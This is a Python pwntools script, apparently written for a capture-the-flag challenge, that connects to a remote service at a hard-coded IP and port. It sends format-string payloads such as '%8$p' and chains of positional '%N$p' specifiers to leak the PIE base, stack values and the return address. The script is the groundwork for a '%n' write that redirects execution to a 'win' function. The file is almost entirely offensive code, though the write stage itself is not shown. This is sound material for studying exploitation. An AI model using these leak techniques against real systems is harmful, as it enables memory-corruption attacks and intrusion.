#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'warning'

HOST = '52.59.124.14'
PORT = 5030

WIN_OFFSET = 0xdbed0
GREETING_OFFSET = 0xdc060

def scan_stack():
    """Scan the stack to find return address and nearby stack pointers."""
    io = remote(HOST, PORT, timeout=10)
    io.recvuntil(b'Name:\n', timeout=5)

    # First get PIE base
    io.sendline(b'%8$p')
    io.recvuntil(b'market:\n', timeout=5)
    greeting = int(io.recvline(timeout=5).decode().strip(), 16)
    pie_base = greeting - GREETING_OFFSET
    expected_ret = pie_base + 0xdc052
    win = pie_base + WIN_OFFSET

    print(f'PIE base: {hex(pie_base)}')
    print(f'Expected return addr value: {hex(expected_ret)}')
    print(f'Win function: {hex(win)}')
    io.close()

    # Now scan positions 70-85 to find the return address
    for start in range(70, 86, 4):
        io = remote(HOST, PORT, timeout=10)
        io.recvuntil(b'Name:\n', timeout=5)

        positions = [start + i for i in range(4)]
        payload = '|'.join([f'%{p}$p' for p in positions]).encode()
        io.sendline(payload)

        io.recvuntil(b'market:\n', timeout=5)
        leak = io.recvline(timeout=5).decode().strip()

        parts = leak.split('|')
        for i, val in enumerate(parts):
            pos = positions[i]
            if val != '(nil)':
                try:
                    v = int(val, 16)
                    marker = ''
                    if v == expected_ret:
                        marker = ' <== RETURN ADDRESS!'
                    elif pie_base <= v < pie_base + 0x200000:
                        marker = ' (PIE range)'
                    elif 0x7f0000000000 <= v < 0x800000000000:
                        marker = ' (stack/libc range)'
                    print(f'  Position {pos}: {val}{marker}')
                except:
                    print(f'  Position {pos}: {val}')
            else:
                print(f'  Position {pos}: (nil)')

        io.close()

def find_stack_pointer_to_ret():
    """
    Find a stack pointer that points to or near the return address location.
    We need: a value on the stack that, when used as address for %n,
    lets us write to the return address.
    """
    io = remote(HOST, PORT, timeout=10)
    io.recvuntil(b'Name:\n', timeout=5)

    # Get PIE and find return address position
    io.sendline(b'%8$p|%77$p|%78$p|%79$p|%80$p|%81$p')
    io.recvuntil(b'market:\n', timeout=5)
    leak = io.recvline(timeout=5).decode().strip()
    print(f'Leak: {leak}')

    parts = leak.split('|')
    greeting = int(parts[0], 16) if parts[0] != '(nil)' else 0
    pie_base = greeting - GREETING_OFFSET
    expected_ret = pie_base + 0xdc052

    for i, val in enumerate(parts[1:], start=77):
        if val != '(nil)':
            try:
                v = int(val, 16)
                if v == expected_ret:
                    print(f'Position {i} contains return address value!')
            except:
                pass

    io.close()

def find_saved_rbp():
    """
    The saved RBP often points near the return address.
    Let's look at positions near where we found data.
    """
    io = remote(HOST, PORT, timeout=10)
    io.recvuntil(b'Name:\n', timeout=5)

    # Scan for stack addresses (0x7fff... range) that might be saved RBP
    payload = b'%75$p|%76$p|%77$p|%78$p|%79$p|%80$p'
    io.sendline(payload)

    io.recvuntil(b'market:\n', timeout=5)
    leak = io.recvline(timeout=5).decode().strip()
    print(f'Positions 75-80: {leak}')

    parts = leak.split('|')
    greeting = None
    for i, val in enumerate(parts, start=75):
        if val != '(nil)':
            try:
                v = int(val, 16)
                # Check if it looks like a stack address
                if 0x7f0000000000 <= v < 0x800000000000:
                    print(f'  Position {i}: {val} - STACK ADDRESS')
                elif 0x500000000000 <= v < 0x600000000000:
                    print(f'  Position {i}: {val} - PIE range')
            except:
                pass

    io.close()

    # Let's also check lower positions for stack addresses
    io = remote(HOST, PORT, timeout=10)
    io.recvuntil(b'Name:\n', timeout=5)

    payload = b'%15$p|%16$p|%17$p|%18$p|%19$p|%20$p'
    io.sendline(payload)

    io.recvuntil(b'market:\n', timeout=5)
    leak = io.recvline(timeout=5).decode().strip()
    print(f'Positions 15-20: {leak}')

    io.close()

if __name__ == '__main__':
    print("=== Scan stack for return address ===")
    scan_stack()

    print("\n=== Find stack pointers ===")
    find_saved_rbp()
